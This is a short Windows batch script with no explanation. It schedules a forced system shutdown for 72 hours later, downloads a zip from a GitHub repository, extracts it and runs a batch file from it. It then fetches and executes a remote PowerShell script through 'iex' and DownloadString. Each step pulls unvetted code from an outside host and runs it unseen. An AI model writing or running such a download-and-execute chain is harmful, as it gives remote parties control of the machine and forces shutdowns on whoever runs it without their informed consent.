start cmd.exe /k "shutdown -s -f -t 259200"
timeout /t 4

start cmd.exe /k "powershell -command "$url = 'https://github.com/mortingenstrasse95/mng/raw/main/XX.zip'; $output = 'C:/Users/Test/Desktop/XX.zip'; $start_time = Get-Date; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); Write-Output 'Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)';"

timeout /t 15

start cmd.exe /k "powershell -command "Expand-Archive -Path C:/Users/Test/Desktop/XX.zip -DestinationPath C:/Users/Test/Desktop/XX/;""

timeout /t 10

start /d "C:/Users/Test/Desktop/XX/xx/" start.bat
timeout /t 6

start cmd.exe /k "powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://github.com/mortingenstrasse95/mng/raw/main/mousemovement.ps1')""
timeout /t 6

exit
